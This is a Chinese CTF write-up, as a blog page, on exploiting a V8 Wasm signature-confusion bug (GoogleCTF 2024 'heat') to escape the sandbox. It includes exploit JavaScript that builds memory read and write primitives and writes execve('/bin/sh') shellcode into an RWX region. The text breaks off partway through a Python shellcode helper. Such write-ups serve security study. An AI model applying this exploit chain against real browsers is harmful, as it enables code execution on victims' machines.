@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Loora1N">
+
+
+
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【V8】GoogleCTF2024-heat SBX Escape | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+
+
+
+    <script src='https://unpkg.com/valine@1.4.16/dist/Valine.min.js'></script>
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                【V8】GoogleCTF2024-heat SBX Escape
+            
+            
+        </div>
+        <span class="post-date">
+            4月 10, 2025
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>通过附件中的<code>build.dockerfile</code>我们可以看到v8的实际回滚版本:</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git fetch &amp;&amp; git switch -d <span class="string">&#x27;f603d5769be54dcd24308ff9aec041486ea54f5b^&#x27;</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>对应<strong>commit:f603d5769be54dcd24308ff9aec041486ea54f5b</strong>的父节点。另外，提供的patch并没增添漏洞功能，只是删除了一些全局obj，那么关键点就在于分析<strong>f603d5</strong>这个commit的提交内容了。</p>
+<p>通过检索，可以得到以下基本信息：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/v8/v8/commit/f603d5769be54dcd24308ff9aec041486ea54f5b">https://github.com/v8/v8/commit/f603d5769be54dcd24308ff9aec041486ea54f5b</a></li>
+<li><a target="_blank" rel="noopener" href="https://issues.chromium.org/issues/336507783">https://issues.chromium.org/issues/336507783</a></li>
+</ul>
+<p>在issues中，我们可以得到漏洞关键信息以及一个poc代码</p>
+<blockquote>
+<p><strong>One place where this currently goes wrong is in JS -&gt; Wasm calls, where in-heap corruption can lead to a mismatch between the signature used by the JSToWasm wrapper and the actual Wasm code. This can in turn lead to out-of-sandbox memory corruption, for example if the number of parameters doesn’t match, in which case the Wasm code may corrupt stack memory.</strong></p>
+<p>个人拙劣翻译一下：目前在<strong>JS -&gt; Wasm</strong>的调用中出现了一个错误，v8堆内的一个内存错误会导致<strong>Wasm</strong>的实际执行的代码和<strong>JSToWasm wrapper</strong>中的函数签名不匹配。这个漏洞将能够转化为沙盒外的内存错误，举个例子，如果函数签名中的参数数量不匹配，会导致<strong>Wasm</strong>执行的代码损害栈内存</p>
+</blockquote>
+<p>poc文件相关链接：</p>
+<ul>
+<li>查看链接：<a target="_blank" rel="noopener" href="https://issues.chromium.org/action/issues/336507783/attachments/56286498?download=false">https://issues.chromium.org/action/issues/336507783/attachments/56286498?download=false</a></li>
+<li>下载链接：<a target="_blank" rel="noopener" href="https://issues.chromium.org/action/issues/336507783/attachments/56286498?download=true">https://issues.chromium.org/action/issues/336507783/attachments/56286498?download=true</a></li>
+</ul>
+<p>那么这个题目就转变为了，<strong>已知POC完成EXP编写</strong>的过程。</p>
+<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>运行POC，可以看到如下报错</p>
+<p><img src="/img/article/v8-heat/image-20250409161622299.png" alt="image-20250409161622299"></p>
+<p>可以证明的确发生了沙盒外的内存错误，且期望hash与实际hash值不相符。紧接着看看POC中内存错误的触发点,相关代码大致如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func1&quot;</span>, $sig_i_l).<span class="title function_">exportFunc</span>().<span class="title function_">addBody</span>([</span><br><span class="line">  kExprLocalGet, <span class="number">0</span>,</span><br><span class="line">  kExprI32ConvertI64,</span><br><span class="line">]);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;boom&quot;</span>, kSig_i_l).<span class="title function_">exportFunc</span>().<span class="title function_">addBody</span>([</span><br><span class="line">  kExprLocalGet, <span class="number">0</span>,</span><br><span class="line">  kExprRefFunc, <span class="number">1</span>,</span><br><span class="line">  kExprCallRef, $sig_i_l,</span><br><span class="line">])</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> target = <span class="title class_">BigInt</span>(<span class="title class_">Sandbox</span>.<span class="property">targetPage</span> - (kStructField0Offset - kHeapObjectTag));</span><br><span class="line">instance.<span class="property">exports</span>.<span class="title function_">boom</span>(target);</span><br></pre></td></tr></table></figure>
+
+<p>可以看构建了两个函数<code>func1</code>和<code>boom</code></p>
+<ul>
+<li><code>func1()</code>的调用形式为：<strong>param(i64) –&gt; result(i32)<strong>，类似C&#x2F;C++中传入一个自定义的 <strong>$struct</strong>结构体，返回</strong>void</strong></li>
+<li><code>boom()</code>的调用形式为：<strong>param(i64) –&gt; result(i32)<strong>，类似C&#x2F;C++中传入一个 <strong>int64</strong>，返回</strong>int32</strong></li>
+</ul>
+<p>而<code>boom</code>在执行时，调用<strong>索引1</strong>的函数引用（也就是<code>func1</code>），理论上讲参数形式都是相符的，不应该存在报错。</p>
+<blockquote>
+<p><strong>部分代码解释</strong></p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kExprLocalGet, <span class="number">0</span>, <span class="comment">// 获取参数0</span></span><br><span class="line">kExprRefFunc, <span class="number">1</span>, <span class="comment">// 获取func1的引用</span></span><br><span class="line">kExprCallRef, $sig_i_l,	<span class="comment">//调用func1，期望类型为$sig_i_l</span></span><br></pre></td></tr></table></figure>
+
+</blockquote>
+<h3 id="签名混淆"><a href="#签名混淆" class="headerlink" title="签名混淆"></a>签名混淆</h3><p>下面看看，其具体做了什么操作，导致了函数参数混淆：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> f0_box = <span class="title function_">getPtr</span>(instance.<span class="property">exports</span>.<span class="title function_">get_func0</span>());</span><br><span class="line"><span class="keyword">let</span> f0 = <span class="title function_">getField</span>(f0_box, kStructField0Offset);</span><br><span class="line"><span class="keyword">let</span> f0_int = <span class="title function_">getField</span>(f0, kWasmInternalFunctionOffset);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f1_box = <span class="title function_">getPtr</span>(instance.<span class="property">exports</span>.<span class="title function_">get_func1</span>());</span><br><span class="line"><span class="keyword">let</span> f1 = <span class="title function_">getField</span>(f1_box, kStructField0Offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">setField</span>(f1, kWasmInternalFunctionOffset, f0_int);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>直观上看，也很容易理解，从<code>func0</code>中取出存储的特定内容，并覆盖给<code>func1</code>的对应位置，使得<code>func1</code>的调用时出现错误。</p>
+<p>具体来说，详细的逻辑链路应当如下：</p>
+<ol>
+<li><strong>从特定位置获取func0的签名</strong> ：<code>let f0_int = getField(f0, kWasmInternalFunctionOffset);</code></li>
+<li><strong>用func0的签名覆盖func1的签名</strong>：<code>setField(f1, kWasmInternalFunctionOffset, f0_int);</code></li>
+<li><strong>调用boom函数，target为i64格式</strong>：<code>instance.exports.boom(target);</code></li>
+<li><strong>boom调用func1的引用，并期望签名为$sig_i_l</strong>：<code>kExprCallRef, $sig_i_l,</code></li>
+<li><strong>检查被调用函数签名与期望签名是否相符</strong>：此时，由于<code>func1</code>的签名已经被覆盖为<code>func0</code>的<code>makeSig([wasmRefType($struct)], [])</code>，与<code>$sig_i_l</code>不相符</li>
+<li><strong>调用失败，程序崩溃：The following harmless error was encountered: Check failed: expected_hash &#x3D;&#x3D; internal_function-&gt;signature_hash().</strong></li>
+</ol>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="从POC到原语"><a href="#从POC到原语" class="headerlink" title="从POC到原语"></a>从POC到原语</h3><p>首先我们需要清楚这个POC为我们提供了什么原语。漏洞提供的POC本身是为了证明函数的签名可以被混淆，那我们可以猜想:</p>
+<p><strong>能不能篡改签名，使得函数的参数与定义不符的情况下，依然可以被正常调用呢？</strong></p>
+<p>我们构造一个新的POC：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// d8.file.execute(&#x27;test/mjsunit/wasm/wasm-module-builder.js&#x27;);</span></span><br><span class="line"><span class="keyword">const</span> builder = <span class="keyword">new</span> <span class="title class_">WasmModuleBuilder</span>();</span><br><span class="line">builder.<span class="title function_">exportMemoryAs</span>(<span class="string">&quot;mem0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">let</span> $mem0 = builder.<span class="title function_">addMemory</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $sig_l_l    = builder.<span class="title function_">addType</span>(kSig_l_l);</span><br><span class="line"><span class="keyword">let</span> $sig_l_0    = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([], [kWasmI64]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $func = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func&quot;</span>, $sig_l_l)</span><br><span class="line">  .<span class="title function_">exportFunc</span>()</span><br><span class="line">  .<span class="title function_">addBody</span>([</span><br><span class="line">      kExprLocalGet, <span class="number">0</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> $func_l_0 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func_l_0&quot;</span>, $sig_l_0)</span><br><span class="line">  .<span class="title function_">exportFunc</span>()</span><br><span class="line">  .<span class="title function_">addBody</span>([</span><br><span class="line">      kExprI64Const, <span class="number">0</span>, <span class="comment">//返回0</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $t = builder.<span class="title function_">addTable</span>(<span class="title function_">wasmRefType</span>($sig_l_0), <span class="number">1</span>, <span class="number">1</span>, [kExprRefFunc, $func_l_0.<span class="property">index</span>]);</span><br><span class="line">builder.<span class="title function_">addExportOfKind</span>(<span class="string">&quot;table&quot;</span>, kExternalTable, $t.<span class="property">index</span>);<span class="comment">//导出表格</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;leak&quot;</span>, $sig_l_0)</span><br><span class="line">  .<span class="title function_">exportFunc</span>()</span><br><span class="line">  .<span class="title function_">addBody</span>([</span><br><span class="line">      kExprI32Const, <span class="number">0</span>,  <span class="comment">// func index</span></span><br><span class="line">      kExprCallIndirect, $sig_l_0, <span class="number">0</span> <span class="comment">/* table num */</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> instance = builder.<span class="title function_">instantiate</span>();<span class="comment">//实例化模型</span></span><br><span class="line"><span class="keyword">let</span> func = instance.<span class="property">exports</span>.<span class="property">func</span>;</span><br><span class="line"><span class="keyword">let</span> table = instance.<span class="property">exports</span>.<span class="property">table</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> kStructField0Offset = <span class="number">8</span>;  <span class="comment">// 0:map, 4:hash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> memory = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(<span class="number">0</span>, <span class="number">0x100000000</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAddressOf_sbx</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj) + kHeapObjectTag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUint32_sbx</span>(<span class="params">obj, offset</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> memory.<span class="title function_">getUint32</span>(obj + offset - kHeapObjectTag, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setUint32_sbx</span>(<span class="params">obj, offset, value</span>)&#123;</span><br><span class="line">  memory.<span class="title function_">setUint32</span>(obj + offset - kHeapObjectTag, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Corrupt the table&#x27;s type to accept putting $func0 into it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> t = <span class="title function_">getAddressOf_sbx</span>(table);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 通过调试查看test table的raw_type段内容获取，如下：</span></span><br><span class="line"><span class="comment">* let $test_table = builder.addTable(wasmRefType($sig_func), 1, 1, [kExprRefFunc, $func.index]);</span></span><br><span class="line"><span class="comment">* builder.addExportOfKind(&quot;test_table&quot;, kExternalTable, $test_table.index);//导出表格</span></span><br><span class="line"><span class="comment">* %DebugPrint($test_table);</span></span><br><span class="line"><span class="comment">* 其中$sig_func是函数的签名</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* 或者有如下type计算公式：</span></span><br><span class="line"><span class="comment">*  const kRef = 9;</span></span><br><span class="line"><span class="comment">*  const kSmiTagSize = 1;</span></span><br><span class="line"><span class="comment">*  const kHeapTypeShift = 5;、</span></span><br><span class="line"><span class="comment">*  let type = (($sig_func &lt;&lt; kHeapTypeShift) | kRef) &lt;&lt; kSmiTagSize;</span></span><br><span class="line"><span class="comment">*  其中$sig_aaw是对应函数的签名</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> kWasmTableObjectTypeOffset = <span class="number">32</span>; <span class="comment">//debug调试即可得到</span></span><br><span class="line"><span class="keyword">const</span> kRef = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">const</span> kSmiTagSize = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> kHeapTypeShift = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> type = (($sig_l_l &lt;&lt; kHeapTypeShift) | kRef) &lt;&lt; kSmiTagSize;</span><br><span class="line"><span class="title function_">setUint32_sbx</span>(t, kWasmTableObjectTypeOffset, type);</span><br><span class="line"></span><br><span class="line">table.<span class="title function_">set</span>(<span class="number">0</span>, func); <span class="comment">//将func放入table中</span></span><br><span class="line"><span class="keyword">let</span> leakAddr = instance.<span class="property">exports</span>.<span class="property">leak</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> something = <span class="title function_">leakAddr</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] leakAddr --&gt; 0x&quot;</span>+<span class="title function_">hex</span>(something));</span><br></pre></td></tr></table></figure>
+
+<p>简单来讲我们做了如下操作：</p>
+<ol>
+<li><strong>更改table中需要存储的函数func_l_0签名</strong></li>
+<li><strong>将func放入table中func_l_0的位置</strong></li>
+<li><strong>调用leak，引用table中索引0的函数，期望类型为$sig_l_0</strong></li>
+<li><strong>返回根本没有传入的参数，从而造成内存泄露</strong></li>
+</ol>
+<blockquote>
+<p>即我们将一个类型为<strong>param(i64) –&gt; result(i64)<strong>的函数转变为</strong>param(NULL) –&gt; result(i64)<strong>，由于实际执行代码时根本没有传入参数（类似</strong>未初始化</strong>漏洞），则可能导致泄露沙盒外的指针。</p>
+</blockquote>
+<h3 id="更多利用原语"><a href="#更多利用原语" class="headerlink" title="更多利用原语"></a>更多利用原语</h3><p>有了沙箱外的地址泄露，下一步就是考虑如何构造<strong>AAW</strong>以及<strong>AAR</strong></p>
+<h4 id="AAW"><a href="#AAW" class="headerlink" title="AAW"></a>AAW</h4><p>假设有如下函数，可以将<code>argv[1]</code>写入<code>$struct</code>结构体的对应域</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> $struct     = builder.<span class="title function_">addStruct</span>([<span class="title function_">makeField</span>(kWasmI64, <span class="literal">true</span>)]);</span><br><span class="line"><span class="keyword">let</span> $sig_0_sl   = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([<span class="title function_">wasmRefType</span>($struct), kWasmI64], []));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $func0 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func0&quot;</span>, $sig_0_sl)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>, <span class="comment">//获取第一个参数</span></span><br><span class="line">        kExprLocalGet, <span class="number">1</span>, <span class="comment">//获取第二个参数</span></span><br><span class="line">        kGCPrefix, kExprStructSet, $struct, <span class="number">0</span>,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<p>如混淆其调用类型为<strong>param(i64, i64) –&gt; result(NULL)</strong> ，不就是类似<code>[argv[0] -1 + 8 ]= argv[1]</code>的任意地址写:</p>
+<blockquote>
+<p>因为<strong>argv[0]<strong>在实际代码执行时，被当作指针，因此需要计算偏移，前面为</strong>map</strong>和<strong>hash</strong>的部分</p>
+</blockquote>
+<h4 id="AAR"><a href="#AAR" class="headerlink" title="AAR"></a>AAR</h4><p>类似的，有如下函数可以获取<code>$struct</code>的对应域</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> $sig_l_s    = builder.<span class="title function_">addType</span>(<span class="title function_">makeSig</span>([<span class="title function_">wasmRefType</span>($struct)], [kWasmI64]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> $func1 = builder.<span class="title function_">addFunction</span>(<span class="string">&quot;func1&quot;</span>, $sig_l_s)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprLocalGet, <span class="number">0</span>,</span><br><span class="line">        kGCPrefix, kExprStructGet, $struct, <span class="number">0</span>,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<p>如混淆其调用类型为<strong>param(i64) –&gt; result(i64)</strong> ，即类似于<code>reslut = [argv[0]-1+8]</code></p>
+<h3 id="开始利用"><a href="#开始利用" class="headerlink" title="开始利用"></a>开始利用</h3><p>有了这些基础，我们就可以开始编写exp了，首先我们需要看看leak能够得到什么</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> leakAddr = instance.<span class="property">exports</span>.<span class="property">leak</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> something = <span class="title function_">leakAddr</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] leakAddr --&gt; 0x&quot;</span>+<span class="title function_">hex</span>(something));</span><br></pre></td></tr></table></figure>
+
+<p>我们能够发现leak得到的是一个<strong>WasmDispatchTableTable</strong>对象，如下：</p>
+<p><img src="/img/article/v8-heat/image-20250410102608845.png" alt="image-20250410102608845"></p>
+<p>并且能够看到，在特定偏移出存放<strong>rwx段的原始指针</strong>。继续查看指针附近的内容：</p>
+<p><img src="/img/article/v8-heat/image-20250410103350287.png" alt="image-20250410103350287"></p>
+<p>相信看到这个内容，足够敏感的pwner已经能够注意到这是一个类似<strong>GOT - PLT表</strong>的结构，<strong>0x0 - 0x9</strong>对应了类似libc中<code>runtime_resolve()</code>所需的函数索引值。</p>
+<blockquote>
+<p>想要具体了解这些结构运行逻辑的同学可以自己调试，并查阅资料</p>
+</blockquote>
+<p>那么我们只需要做类似<strong>GOT Hijacking</strong>的操作：</p>
+<ul>
+<li>在一个空闲的区域写入shellcode</li>
+<li>然后将某个函数的执行流更改到shellcode上即可</li>
+<li>这里我选择的是新创建的函数<code>boom</code>，这样也不会和其他构造的函数冲突</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.<span class="title function_">addFunction</span>(<span class="string">&quot;boom&quot;</span>, $sig_l_l)</span><br><span class="line">    .<span class="title function_">exportFunc</span>()</span><br><span class="line">    .<span class="title function_">addBody</span>([</span><br><span class="line">        kExprI64Const, <span class="number">0</span>,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为是最后一个构造的函数，对应就是索引为<strong>0x9</strong>，偏移为<strong>0x2d</strong>的位置。写入时需要注意参数1的形式</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">anyAddrWrite</span>(target, <span class="number">0x622fbf4856f63148n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x8n</span>, <span class="number">0x48570068732f6e69n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x10n</span>, <span class="number">0xc0c748d23148e789n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x18n</span>, <span class="number">0x050f006a0000003bn</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(target+<span class="number">0x30n</span>, <span class="number">0x0000000000050f00n</span>);</span><br><span class="line"><span class="title function_">anyAddrWrite</span>(rwx_part1+<span class="number">0x2dn</span>-<span class="number">8n</span>+<span class="number">1n</span>, <span class="number">0xdd6e9n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">boom</span>(<span class="number">0x1n</span>);</span><br></pre></td></tr></table></figure>
+
+<p>关于shellcode的构造，借助pwntools库即可。这里我用deepseek帮我生成了一个脚本，用于生成小端序的i64格式shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_64bit_shellcode</span>(<span class="params">assembly_code</span>):</span><br><span class="line">    <span class="comment"># 设置上下文为64位</span></span><br><span class="line">    context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 汇编并自动优化代码</span></span><br><span class="line">        shellcode = asm(assembly_code)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Assembly success, byte len:&quot;</span>, <span 